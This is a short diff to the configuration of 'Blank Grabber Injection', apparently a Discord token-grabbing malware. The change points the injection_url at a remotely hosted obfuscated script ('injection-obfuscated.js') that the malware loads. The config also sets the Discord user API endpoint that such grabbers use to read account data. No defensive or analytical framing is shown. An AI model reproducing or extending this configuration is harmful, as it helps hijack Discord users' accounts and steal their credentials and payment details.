@@ -15,7 +15,7 @@ const config = {
   embed_name: 'Blank Grabber Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/reallopez/dctool/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
